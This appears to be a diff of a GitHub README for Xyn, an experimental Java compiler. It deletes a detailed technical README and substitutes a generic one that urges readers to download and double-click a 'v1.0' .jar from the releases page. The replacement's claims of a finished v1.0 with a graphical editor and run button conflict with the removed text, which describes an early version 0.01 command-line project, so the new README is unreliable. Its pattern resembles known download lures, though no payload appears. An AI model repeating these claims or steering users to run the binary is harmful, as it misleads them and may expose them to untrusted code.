@@ -1,384 +1,61 @@
-
-# Xyn Compiler
-
-## Chapters
-
-1. [Overview](#overview)
-2. [Variables](#variables)
-
-## Overview
-
-Xyn is an **experimental**, **self-designed programming language**
-and compiler project focused on ***clarity***, ***control***,
-and ***explicitness***, while still being grounded in solid compiler
-theory and modern implementation techniques.
-
-The project is developed entirely in **Java**, with the
-explicit goal of being ***understandable***, ***extensible***,
-and ***maintainable*** **over time**.
-
-This repository documents the **design decisions**,
-**internal architecture**, and **theoretical foundations** of the
-Xyn compiler.
-
-> Xyn is **not designed to compete** with mainstream languages.
-> It is a **learning-driven** and **research-oriented project**
-> that prioritizes understanding how compilers really work.
-
-## Variables
-
-### Sections:
-- [Types in Xyn](#types)
-- [Example 0](#example-0)
-- [Nullability](#nullability)
-- [Static or Dynamic?](#static--dynamic-variable-in-xyn)
-  
-### Types
-
-- **There are so many types in Xyn that can you use, from built-ins, libraries, and user-defined types.**\
-  They have their own **functionality and cost**, so it's a good thing to use **different types** for **different situations**.
-
-#### There are **three categories** about **how types in Xyn** can **splits into**.
-|          Categories         |                      Types                    |                  Description                |
-|            :---:            |                      :---:                    |                     :--:                    |
-|        **Primitive**        |     `int`, `float`, `char`, `str`, `bool`     |         basic types with fixed size         |
-|       **Collections**       |        `List<T>`, `Map<K, V>`, `Set<E>`       |  type-safe data structure with dynamic size |
-|      **User-defined**       |      `PersonClass`, `Player`, `Inventory`     |    flexible data structure stored in heap   |
-
-
-
-### Example 0:
-```rs
-
-let age: int = 12;
-// this is not allowed because `age` is not nullable
-age = null;
-
-dyn name = age;
-name = null; // another error
-
-```
-
-### Nullability
-
-
-### Type Inference and Static Typing
-
-Xyn provides **type inference** for statement declarations such as **variables**, **functions**, and more.  
-Xyn also supports **static typing**, which offers its own advantages compared to **type inference**.
-
-#### Benefits of Type Inference
-
-- **Shorter and less boilerplate** declarations for **long** and **repetitive** types.  
-  Write **what matters**, not **redundant** information  
-  (e.g. *SystemInformerInterface*, *List<Map<Str, Set<Integer>>>*, etc.).
-
-- **Improved local reasoning**.  
-  Code becomes easier to read from top to bottom without **mentally parsing** explicit type declarations.  
-  Especially powerful for **expressions**, **closures / lambdas**, and **temporary values**.
-
-- **Safer and faster refactoring**.  
-  Changing a single definition is easier when types are inferred, because the compiler **automatically propagates type changes**.
-
-- Enables powerful **abstractions**.  
-  Type inference makes **generics**, **pattern matching**, and other advanced features much easier to write without *explicitly* specifying type parameters.
-
-### Examples
-
-```rs
-// before
-let list: List<Integer?> = new List<Integer?>();
-
-// after (note: `int` is lowered to `Integer` by the compiler)
-let list = new List<int?>();
-
-
-// before
-let type: enumType = enumType.A;
-
-// after
-let type = enumType.A;
-
-
-// before
-func put(x: List<Integer>, y: int) -> List<Integer> {
-  x.add(y);
-  return x;
-}
-
-// after
-func put(x: List<int>, y: int) {
-  x.add(y);
-  return x;
-}
-```
-The examples above demonstrate how type inference works in Xyn.
-However, some developers prefer **explicit static typing** for **clarity** and **intent**.
-Xyn **fully supports** static typing, enhanced with **additional syntactic sugar** to keep code ***concise*** and ***expressive***.
-### Benefits of Static Typing:
-
-- Extra **clarity** and **safety**.\
-  These are especially important in large projects with **multiple contributors**, where developers **cannot always infer** each other’s **intentions**. Explicit types      serve as a **clear contract** and **documentation** for shared code. Bugs and errors are caught earlier, before the program runs.
-
-- With **static typing**, the compiler can detect **invalid type usage** at **compile time**.
-
-- **Simpler** and **faster** runtime **execution**.\
-  Since types are **fully known** at **compile time**, the runtime can **be simpler**, **more predictable**, and **more optimized** without ***dynamic dispatch*** or        other ***complex runtime mechanisms***.
-
-### Examples
-```rs
-// before
-let john: Person = new Person("John");
-
-// after
-let john: Person("John");
-
-
-// before
-let personJob: JobType = JobType.None;
-
-// after
-let personJob: JobType = None; // resolved to JobType.None at compile time
-
-
-// before
-let name = null; // unknown type
-
-// after
-let name: str? = null; // nullable string
-name = "John";
-```
-
----
-
-## Project Goals
-####
-- **Design and implement** a full compiler pipeline **from scratch**.
-
-
-- **Prioritize imperative semantics** and **explicit control flow**.
-
-
-- Keep abstractions **minimal and understandable**.
-
-
-- Avoid unnecessary **magic or hidden behavior**.
-
-
-- **Learn and apply** real-world compiler techniques
-  (used in **LLVM**, **JVM**, and modern **PLs**)
-
-
----
-
-## Language Philosophy
-####
-**Xyn is intentionally designed around these principles**:
-
-1. **Imperative-first**: You **explicitly describe** ***how***
-   things happen, not just ***what*** happens.
-
-2. **Predictable semantics**: Language behavior should be
-   **obvious** from reading the code.
-
-3. **Minimal core**: The language starts small and grows
-   deliberately.
-
-4. **Bootstrappable**: Even fundamental concepts (like strings)
-   are not assumed ***magically***.
-
-**The language intentionally avoids overly abstract or
-purely functional paradigms, favoring transparency and control**.
-
-
----
-
-## Implementation Language
-
-**Xyn made from purely all Java ecosystem and tooling**.
-
-### Java was chosen because:
-
-1. **Strong tooling** and **debuggability**.
-
-2. **Explicit memory** and **object model**.
-
-3. **Easier long-term maintenance**.
-
-4. **Better alignment** with **imperative reasoning**.
-
-
-
-
----
-
-### Compiler Architecture Overview
-
-**The Xyn compiler follows a traditional but
-carefully designed pipeline**:
-
-> **Source Code** → **Lexer** (Lexical Analysis) → **Parser**
-> (Syntax Analysis) → **AST** (Abstract Syntax Tree)
-> → **Type Checker** (Semantic Analysis) → **IR**
-> (Intermediate Representation with Three-Address Code)
-> → **SSA Transformation** → **Optimizations**
-> → **Backend** / **Code Generation** (planned).
-
-**Each stage is intentionally isolated and inspectable**.
-
----
-
-### Memory Management Strategy
-
-> Fast allocation, cheap deallocation (bulk-free)
-
-#### Especially suited for:
-
-- AST nodes
-
-- IR instructions
-
-- Temporary compiler data
-
-
-**This mirrors techniques used in real compilers** (**LLVM**, **GCC**).
-
-
----
-
-## Error Reporting & Diagnostics
-
-### A major focus of Xyn is high-quality diagnostics:
-
-- **Colored error output**.\
-  **Error message** colored **white**, **Error location** with **red**, and others with **green**.
-
-- **Exact** source highlighting.\
-  Xyn's Error Engine use **span location** from **every Error class** and then display it to the screen.
-
-- **Multiple severity levels**.\
-  Xyn's errors divided **line by line**, start from **one** and **so on** orderly.
-
-- **Clear messages** specified to aimed at **humans**, **not machines**.
-
-
-**The goal is for error messages to teach, not merely report failure**.
-
----
-
-
-### What are done for now:
-
-#### Features:
-**[version 0.01]**
-- **Basic variable declaration**.
-- **Variable declaration supports static typing and type inference**.
-- **Supports three types** (i.e, String, Integer, Float)
-
-#### Technical:
-**[version 0.01]**
-- **Lexer**, supports assignment operator (e.g., ident, equal sign, let keyword, etc.), three values (i.e, int, float, string), and operation operators.
-- **Parser**, supports basic declarations and error recovery with maximum lookahead are 5.
-- **Semantic**, have a type checking task that check expression type and compare it with it's declared type (if declared).
-- **HIR (High IR) generator**, can generate basic declarations IR based on three address code, do type conversion, and do optimization to the generated IR.
-- **HIR Pass** (subset of IR generator), do optimization on the generated IR for multiple pass.
-- **Error Engine**, stores all error. When reporting, it separates all the errors line by line orderly from least to greatest, and display the errors with pretty output.
-
----
-
-### Planned & Ongoing Work
-
-> Disclaimer: **Feature or technical stuff maybe appear not as the expected version**.
-
-#### Feature:
-**[for version 0.05]**
-- **Dynamic Variable**. [ ]
-- **Simple control flow statement** (e.g., if and else statement). [ ]
-
-#### Technical:
-**[for version 0.02]**
-- **Completing the HIR Pass and makes the optimization works**. [X]
-- **Clean the HIR code and make it more modular**. [X]
-
-**[for version 0.03]**
-- **Make a LIR (Low IR) Generator that generate VM-ready instruction from the HIR**. [X]
-
-**[for version 0.04]**
-- **Make a LIR storer that will store the LIR code into a .xir file** [X]
-- **Make a VM that used the LIR and execute it**. [X]
-
-**[for version 0.045]**
-- **Cleaner code**. [ ]
-- **Modular code**. [ ]
-- **Faster runtime**. [ ]
-- **Making comments to some parts of the code, so it can be more readable**. [ ]
-- **review all of it, and planning for the next feature**. [ ]
-
-**[for version 0.046]**
-- **revise and rewrite the README file**. [ ]
----
-
-## Inspirations & References
-
-### Xyn is inspired by:
-
-- **LLVM IR** & **SSA design**.
-
-- **JVM** and **bytecode-based architectures**.
-
-- **ML-family compiler theory** (conceptually).
-
-- **Classic compiler literature** (Dragon Book–style pipelines).
-
-- And some features from other programming languages.
-
-
-**While inspired by many systems, Xyn deliberately avoids copying any single one**.
-
-
----
-
-## Contribution & Collaboration
-
-#### This project is open to critique, discussion, and collaboration.
-
-#### Design criticism is welcome.
-
-#### Alternative approaches are encouraged.
-
-#### Discussions about trade-offs are valued.
-
-
-#### If you are interested in:
-
-- **Compiler design**.
-
-- **Programming language theory**.
-
-- **IR** / **SSA** / **optimizations**.
-
-
-**Feel free to open issues, propose changes, or start discussions**.
-
-
----
-
-### Status
-
-#### Xyn is an active experimental project.
-
-### Expect:
-
-* Breaking changes
-
-* Refactors
-
-* Design evolution
-
-
-**The primary goal is deep understanding, not short-term stability.**
-
-
----
-
-#### Xyn exists to explore how programming languages are built — deliberately, transparently, and thoughtfully.
+# 🚀 Xyn-Compiler - Build Your Own Simple Language Tool
+
+## 🔗 Download Xyn-Compiler
+[![Download Xyn-Compiler](https://img.shields.io/badge/Download%20Xyn--Compiler-v1.0-blue)](https://github.com/MDS129/Xyn-Compiler/releases)
+
+## 📖 Introduction
+Xyn-Compiler is my first compiler created with Java. It allows users to experiment with building and executing code in a custom programming language. This tool supports concepts such as null safety and static typing, making it a valuable resource for anyone interested in language design.
+
+## 💻 Features
+- **Simple User Interface**: Designed for ease of use, even for beginners.
+- **Null Safety**: Helps prevent errors by managing null references automatically.
+- **Static Typing**: Ensures that variables have a defined type, improving code reliability.
+- **Type Inference**: Automatically determines data types, reducing the need for explicit declarations.
+- **Reference Types**: Provides a way to manage data without the need for primitive types only.
+
+## 🛠️ System Requirements
+To run the Xyn-Compiler, you will need:
+- A computer with Windows, macOS, or Linux.
+- Java Runtime Environment (JRE) version 11 or higher installed on your computer.
+- At least 1 GB of RAM.
+- 100 MB of available hard drive space.
+
+## 📥 Download & Install
+To get started, visit the Releases page to download the latest version of Xyn-Compiler. Click the link below to access the page:
+
+[Visit the Releases Page to Download](https://github.com/MDS129/Xyn-Compiler/releases)
+
+### Installation Steps
+1. Click on the latest release version on the Releases page.
+2. Look for the file named `Xyn-Compiler.v1.0.jar`.
+3. Once you find the file, click to download it to your computer.
+4. After the download is complete, locate the file in your downloads folder.
+5. To run the compiler, double-click the `.jar` file. Make sure you have the Java Runtime Environment installed.
+
+## ⚙️ How to Use Xyn-Compiler
+1. **Write Code**: Start by writing your code in the provided text editor or your favorite code editor.
+2. **Compile**: In the Xyn-Compiler, load your code file.
+3. **Execute**: Click the run button to see the output of your code.
+
+## 📝 Tips for Success
+- Save your code frequently to avoid losing your work.
+- Test small pieces of code to understand how the compiler works.
+- Refer to the documentation for troubleshooting common issues.
+
+## 🔧 Troubleshooting
+If you encounter any problems while using the Xyn-Compiler, try these steps:
+- Ensure that your Java Runtime Environment is properly installed.
+- Check the code for syntax errors.
+- Restart the program if it becomes unresponsive.
+
+## 👥 Community and Support
+Join our community to share your experiences and ask questions. You can find help on forums dedicated to programming languages and compilers. 
+
+Feel free to submit issues or suggestions on the GitHub page if you encounter bugs or have ideas for improvement.
+
+## 📚 Additional Resources
+- [Java Download](https://www.oracle.com/java/technologies/javase-jre11-downloads.html)
+- [Language Design Principles](https://en.wikipedia.org/wiki/Programming_language_design)
+- [Compiler Overview](https://en.wikipedia.org/wiki/Compiler)
+
+We hope you enjoy using Xyn-Compiler and look forward to seeing what you create!
